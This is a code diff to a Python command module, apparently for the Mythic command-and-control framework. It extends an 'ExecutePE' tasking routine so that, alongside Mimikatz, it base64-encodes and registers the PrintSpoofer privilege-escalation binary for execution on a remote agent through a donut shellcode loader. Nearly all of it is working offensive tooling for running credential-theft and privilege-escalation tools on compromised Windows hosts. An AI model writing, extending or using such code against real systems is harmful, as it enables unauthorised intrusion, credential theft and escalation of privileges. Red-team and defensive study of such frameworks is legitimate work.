@@ -7,8 +7,10 @@ from os import path
 import base64
 import donut
 
+PRINTSPOOFER_FILE_ID = ""
 MIMIKATZ_FILE_ID = ""
-EXECUTEPE_STUB_ID = ""
+
+PE_VARNAME = "pe_id"
 
 class ExecutePEArguments(TaskArguments):
 
@@ -44,11 +46,13 @@ class ExecutePECommand(CommandBase):
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         global MIMIKATZ_FILE_ID
-        global EXECUTEPE_STUB_ID
+        global PRINTSPOOFER_FILE_ID
+        global PE_VARNAME
+
         task.args.add_arg("pipe_name", str(uuid4()))
         exePath = "/srv/ExecutePE.exe"
         mimikatz_path = "/Mythic/agent_code/mimikatz_x64.exe"
-
+        printspoofer_path = "/Mythic/agent_code/PrintSpoofer_x64.exe"
         shellcode_path = "/tmp/loader.bin"
 
 
@@ -83,10 +87,11 @@ class ExecutePECommand(CommandBase):
                 task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
             else:
                 raise Exception("Failed to register ExecutePE shellcode: " + file_resp.error)
-                
+
+        # I know I could abstract these routines out but I'm rushing
         if task.args.get_arg("pe_name") == "mimikatz.exe":
             if MIMIKATZ_FILE_ID != "":
-                task.args.add_arg("mimipe", MIMIKATZ_FILE_ID)
+                task.args.add_arg(PE_VARNAME, MIMIKATZ_FILE_ID)
             else:
                 with open(mimikatz_path, "rb") as f:
                     mimibytes = f.read()
@@ -96,10 +101,26 @@ class ExecutePECommand(CommandBase):
                             file=b64mimi,
                             delete_after_fetch=False)
                 if file_resp.status == MythicStatus.Success:
-                    task.args.add_arg("mimipe", file_resp.response["agent_file_id"])
+                    task.args.add_arg(PE_VARNAME, file_resp.response["agent_file_id"])
                     MIMIKATZ_FILE_ID = file_resp.response["agent_file_id"]
                 else:
                     raise Exception("Failed to register Mimikatz: " + file_resp.error)
+        elif task.args.get_arg("pe_name") == "printspoofer.exe":
+            if PRINTSPOOFER_FILE_ID != "":
+                task.args.add_arg(PE_VARNAME, PRINTSPOOFER_FILE_ID)
+            else:
+                with open(printspoofer_path, "rb") as f:
+                    psbytes = f.read()
+                b64ps = base64.b64encode(psbytes).decode()
+                file_resp = await MythicRPC().execute("create_file",
+                            task_id=task.id,
+                            file=b64ps,
+                            delete_after_fetch=False)
+                if file_resp.status == MythicStatus.Success:
+                    task.args.add_arg(PE_VARNAME, file_resp.response["agent_file_id"])
+                    PRINTSPOOFER_FILE_ID = file_resp.response["agent_file_id"]
+                else:
+                    raise Exception("Failed to register PrintSpoofer: " + file_resp.error)
         return task
 
     async def process_response(self, response: AgentResponse):
